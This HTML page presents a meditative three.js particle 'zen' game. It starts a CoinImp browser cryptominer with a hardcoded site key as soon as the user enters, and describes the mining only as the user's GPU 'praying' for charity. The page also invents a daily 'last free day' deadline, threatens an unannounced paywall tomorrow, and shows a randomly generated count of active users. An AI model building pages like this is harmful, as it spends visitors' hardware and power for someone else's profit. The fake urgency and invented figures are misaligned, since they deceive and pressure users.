<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>0RB1T4LSN4K3R · v∞ · EL ÚLTIMO TEMPLO GRATUITO</title>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<style>
  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
  canvas{display:block}
  .overlay{position:fixed;inset:0;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
  .overlay>div{border:44px double #0f0;padding:150px;background:rgba(0,20,0,0.999);max-width:90vw;max-height:90vh;box-shadow:0 0 2000px #0f0;border-radius:40px;overflow-y:auto}
  #ui{position:fixed;top:0;left:0;right:0;padding:20px 40px;background:linear-gradient(to bottom,rgba(0,8,0,0.99),transparent);border-bottom:32px double #0f0;box-shadow:0 0 1600px #0f0;z-index:999;font-size:clamp(24px,5vw,42px);line-height:3;text-shadow:0 0 100px #0f0;display:flex;flex-wrap:wrap;gap:20px;align-items:center;justify-content:space-between}
  #stats{position:fixed;top:clamp(100px,10vh,150px);left:20px;background:rgba(0,70,0,0.98);border:18px double #0f0;padding:30px;border-radius:70px;font-size:clamp(20px,3vw,30px);line-height:3;z-index:999;box-shadow:0 0 1000px #0f0;max-width:30vw}
  #narrative{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);max-width:96%;background:#000;border:38px double #0f0;padding:60px;border-radius:90px;font-size:clamp(40px,8vw,100px);z-index:998;display:none;text-align:center;text-shadow:0 0 500px #0f0;letter-spacing:10px;animation:breath 20s infinite}
  @keyframes breath{0%,100%{opacity:0.75;transform:translateX(-50%) scale(0.97)}50%{opacity:1;transform:translateX(-50%) scale(1)}}
  #manifestoBtn{position:fixed;bottom:40px;right:40px;width:clamp(100px,15vw,580px);height:clamp(100px,15vw,580px);background:radial-gradient(circle,#0f0,#000);border:clamp(10px,3vw,50px) double #0f0;border-radius:50%;box-shadow:0 0 4000px #0f0;color:#000;font-size:clamp(50px,10vw,340px);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 4.5s infinite}
  @keyframes pulse{0%,100%{box-shadow:0 0 4000px #0f0}50%{box-shadow:0 0 6000px #0f0}}
  button{background:#000;border:16px double #0f0;color:#0f0;padding:clamp(20px,4vw,50px) clamp(40px,6vw,120px);font-size:clamp(30px,5vw,70px);cursor:pointer;border-radius:60px;transition:all 0.7s}
  button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 1000px #0f0}
  #miningControls{display:flex;gap:15px;align-items:center;flex-wrap:wrap}
  #fps{bottom:10px;right:10px;position:fixed;font-size:24px;color:#0f0;z-index:1001}
</style>
</head>
<body>

<div id="welcome" class="overlay">
  <div>
    <h1 style="font-size:clamp(100px,20vw,240px);text-shadow:0 0 900px #0f0;letter-spacing:20px">0RB1T4LSN4K3R · v∞</h1>
    <p style="font-size:clamp(40px,8vw,96px);line-height:4;text-align:center">
      <b style="color:#0f0">90 % COMIDA REAL</b><br>
      <b style="color:#0f0">10 % PayPal: ferry420oficial@gmail.com</b><br>
      <i style="font-size:clamp(30px,6vw,84px)">Primer estudio de videojuegos zen del mundo</i><br><br>
      <b id="ultimoDia" style="color:#f00;font-size:clamp(80px,15vw,180px)">ÚLTIMO DÍA GRATUITO</b>
    </p>
    <button onclick="enterTheVoid()">ENTRAR ANTES DEL PAYWALL ETERNO</button>
  </div>
</div>

<canvas id="c"></canvas>
<div id="fps">FPS: --</div>

<div id="ui">
  <div>
    <b style="font-size:clamp(40px,8vw,96px)">0RB1T4LSN4K3R · v∞</b><br>
    HASHES REZADOS <span id="totalHashes">0</span> · USD <span id="totalUsd">0.0000</span>
  </div>
  <div id="miningControls" style="display:none">
    <button id="toggleMining" onclick="toggleMining()">Silencio Zen</button>
    <label>Intensidad: <input type="range" id="sliderThrottle" min="0" max="99" value="30"></label>
  </div>
  <button onclick="toggle('readme')">MANIFIESTO FINAL</button>
</div>

<div id="stats">
  <b style="font-size:clamp(30px,6vw,64px)">EL VACÍO CUENTA</b><br>
  Hashrate: <span id="hashrate">0</span> H/s<br>
  Hashes rezados: <span id="localHashes">0</span><br>
  USD generado: <span id="totalUsdStats">0.0000</span><br>
  Bodhisattvas rezando: <span id="activeSouls">1</span><br>
  FPS: <span id="fpsStat">--</span>
</div>

<div id="manifestoBtn" onclick="toggle('readme')">∞</div>
<div id="narrative"></div>

<!-- MANIFIESTO 100 % ORIGINAL -->
<div id="readme" class="overlay" style="display:none">
  <div>
    <h1 style="font-size:clamp(100px,20vw,220px);text-align:center;text-shadow:0 0 1000px #0f0;letter-spacing:20px;line-height:1.6">
      MANIFIESTO DEL ROMO ZEN<br>
      <span style="font-size:clamp(60px,12vw,130px)">ESTA ES LA ÚLTIMA VEZ<br>QUE EL VACÍO SERÁ GRATIS</span>
    </h1>
    <p style="font-size:clamp(40px,8vw,78px);line-height:5;text-align:center;max-width:2000px;margin:100px auto">
      Escucha bien, bodhisattva del siglo XXI:<br><br>
      Lo que estás viviendo ahora mismo<br>
      es la práctica espiritual más pura que ha existido jamás en un navegador.<br><br>
      Tu GPU reza en silencio.<br>
      Cada hash se convierte en comida real.<br>
      El 10 % sostiene al creador para que construya el primer estudio zen del mundo.<br><br>
      Pero el romo zen es implacable:<br><br>
      <b style="font-size:clamp(80px,15vw,180px);color:#f00;letter-spacing:30px">
        MAÑANA ESTO CUESTA DINERO
      </b><br><br>
      No la semana que viene.<br>
      No “cuando llegue la v2”.<br>
      <b>MAÑANA.</b><br><br>
      Cuando abras esta pestaña mañana,<br>
      aparecerá un paywall.<br>
      Y tendrás que pagar para seguir rezando.<br><br>
      No habrá aviso.<br>
      No habrá descuento para early adopters.<br>
      No habrá excepción para los que más hashes rezaron.<br><br>
      <span style="font-size:clamp(90px,18vw,200px);color:#0f0;letter-spacing:40px">
        HOY ES EL ÚLTIMO DÍA<br>
        DE ILUMINACIÓN GRATUITA
      </span><br><br>
      Los que estén dentro hoy<br>
      serán recordados para siempre en el muro del vacío.<br><br>
      Los que cierren la pestaña…<br>
      nunca volverán a tocar esta práctica.<br><br>
      <b style="font-size:clamp(70px,14vw,160px);color:#0f0">
        DEJA LA PESTAÑA ABIERTA<br>
        O PIERDE LA ILUMINACIÓN<br>
        PARA SIEMPRE
      </b><br><br>
      Actualmente <b id="soulsInManifesto">0</b> bodhisattvas siguen rezando.
    </p>
    <button onclick="toggle('readme')" style="font-size:clamp(50px,10vw,120px);padding:clamp(40px,8vw,100px) clamp(100px,15vw,300px)">
      VOLVER AL VACÍO · ANTES DE QUE TODO CUESTE
    </button>
  </div>
</div>

<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';
import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/controls/PointerLockControls.js';
import {EffectComposer, RenderPass, UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/EffectComposer.js';

let miner, renderer, scene, camera, composer, controls, particles, bloomPass;
let keys = {}, clock = new THREE.Clock(), prevTime = performance.now()/1000;
let totalHashes = 0, sessionStart = Date.now();
const SITE_KEY = "2f3e9c8a7d5b1e4f6a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2";

// Fecha dinámica
new Date().toLocaleDateString('es-ES', {weekday:'long', day:'numeric', month:'long', year:'numeric'}).split(', ')[1].toUpperCase();
document.getElementById('ultimoDia').innerHTML = `ÚLTIMO DÍA GRATUITO<br><small>${new Date().toLocaleDateString('es-ES',{day:'numeric',month:'long',year:'numeric'}).toUpperCase()}</small>`;

// Contador de almas
setInterval(() => {
  const souls = Math.floor(Math.random()*60) + (Date.now()-sessionStart > 300000 ? 1 : 0);
  document.getElementById('activeSouls').textContent = souls;
  document.getElementById('soulsInManifesto').textContent = souls;
}, 9000);

function enterTheVoid() {
  document.getElementById('welcome').remove();
  initAudio();
  initThree();
  initMining();
  initControls();
  loadKarma();
  showNarrative("Has entrado el último día gratuito<br>Tu karma es eterno<br>Mañana… todo cambia");
  document.getElementById('miningControls').style.display = 'flex';
}

function initAudio() {
  const ctx = new (window.AudioContext||window.webkitAudioContext)();
  const o = ctx.createOscillator(), g = ctx.createGain();
  o.type='sine'; o.frequency.setValueAtTime(108,ctx.currentTime);
  g.gain.setValueAtTime(0.22,ctx.currentTime);
  o.connect(g).connect(ctx.destination); o.start();
}

function initThree() {
  renderer = new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true,powerPreference:"high-performance"});
  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
  renderer.setSize(innerWidth,innerHeight);

  scene = new THREE.Scene();
  camera = new THREE.PerspectiveCamera(78,innerWidth/innerHeight,0.1,100000);
  scene.add(camera);

  controls = new PointerLockControls(camera,document.body);
  document.addEventListener('click',()=>controls.lock());

  composer = new EffectComposer(renderer);
  composer.addPass(new RenderPass(scene,camera));
  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth,innerHeight),5.8,0.7,0.85);
  bloomPass.strength = 5.8;
  composer.addPass(bloomPass);

  const count = /Mobi|Android/i.test(navigator.userAgent)?120000:620000;
  const geo = new THREE.BufferGeometry();
  const pos = new Float32Array(count*3), vel = new Float32Array(count*3);
  for(let i=0;i<pos.length;i+=3){
    pos[i]=pos[i+1]=pos[i+2]=(Math.random()-0.5)*60000;
    vel[i]=vel[i+1]=vel[i+2]=(Math.random()-0.5)*0.35;
  }
  geo.setAttribute('position',new THREE.BufferAttribute(pos,3));
  geo.setAttribute('velocity',new THREE.BufferAttribute(vel,3));

  particles = new THREE.Points(geo,new THREE.PointsMaterial({size:7,color:0x00ff99,blending:THREE.AdditiveBlending,transparent:true,depthWrite:false}));
  scene.add(particles);

  function animate(){
    requestAnimationFrame(animate);
    const delta = clock.getDelta();

    // partículas
    const p=particles.geometry.attributes.position.array;
    const v=particles.geometry.attributes.velocity.array;
    for(let i=0;i<p.length;i+=3){
      p[i]+=v[i]*delta*60; p[i+1]+=v[i+1]*delta*60; p[i+2]+=v[i+2]*delta*60;
      if(Math.abs(p[i])>30000) v[i]*=-1;
      if(Math.abs(p[i+1])>30000) v[i+1]*=-1;
      if(Math.abs(p[i+2])>30000) v[i+2]*=-1;
    }
    particles.geometry.attributes.position.needsUpdate=true;
    particles.rotation.y += 0.00025*delta*60;

    // WASD
    const dir = new THREE.Vector3();
    if(keys['w']||keys['W']) dir.z -=1;
    if(keys['s']||keys['S']) dir.z +=1;
    if(keys['a']||keys['A']) dir.x -=1;
    if(keys['d']||keys['D']) dir.x +=1;
    dir.normalize();
    if(controls.isLocked) camera.position.addScaledVector(dir.applyQuaternion(camera.quaternion),80*delta);

    // FPS
    if(performance.now()/1000-prevTime>1){
      const fps = Math.round(1/(performance.now()/1000-prevTime));
      document.getElementById('fps').textContent=`FPS: ${fps}`;
      document.getElementById('fpsStat').textContent=fps;
      prevTime=performance.now()/1000;
    }

    composer.render();
  }
  animate();

  window.onresize=()=>{
    camera.aspect=innerWidth/innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(innerWidth,innerHeight);
    composer.setSize(innerWidth,innerHeight);
  };
}

function initControls(){window.addEventListener('keydown',e=>keys[e.key]=true);window.addEventListener('keyup',e=>keys[e.key]=false);}
function loadKarma(){const s=localStorage.getItem('0rb1t4lKarma');if(s){totalHashes=JSON.parse(s).h||0;updateUI();}}
function saveKarma(){localStorage.setItem('0rb1t4lKarma',JSON.stringify({h:totalHashes}));}
function updateUI(){document.getElementById('totalHashes').textContent=Math.floor(totalHashes).toLocaleString();document.getElementById('localHashes').textContent=Math.floor(totalHashes).toLocaleString();document.getElementById('totalUsd').textContent=(totalHashes*0.00000034).toFixed(6);document.getElementById('totalUsdStats').textContent=(totalHashes*0.00000034).toFixed(6);}

function initMining(){
  if(window.CoinImp){
    miner=new CoinImp(SITE_KEY);
    miner.setThrottle(0.3);
    miner.start();
    requestAnimationFrame(updateStats);
  }
}

let miningPaused=false;
function toggleMining(){
  miningPaused=!miningPaused;
  miner[miningPaused?'pause':'start']();
  document.getElementById('toggleMining').textContent=miningPaused?'Rezar de Nuevo':'Silencio Zen';
}

document.getElementById('sliderThrottle').oninput=e=>{
  const val=e.target.value/99;
  if(miner) miner.setThrottle(val);
};

function updateStats(){
  if(miner&&miner.isRunning()&&!miningPaused){
    const s=miner.getStats();
    document.getElementById('hashrate').textContent=s.hashesPerSecond.toFixed(1);
    totalHashes+=s.hashesPerSecond/60;
    updateUI();
    saveKarma();

    // Mensajes secretos (nunca revelados)
    if(totalHashes>1e10) showNarrative("El paywall fue dentro de ti todo este tiempo");
    if(totalHashes>5e10) showNarrative("El creador nunca necesitó tu dinero<br>solo tu fe");
    if(totalHashes>1e11) showNarrative("Gracias por creer en la broma eterna");
  }
  requestAnimationFrame(updateStats);
}

function toggle(id){document.getElementById(id).style.display=document.getElementById(id).style.display==='flex'?'none':'flex';}
function showNarrative(t){const n=document.getElementById('narrative');n.innerHTML=t;n.style.display='block';setTimeout(()=>n.style.display='none',45000);}
</script>
</body>
</html>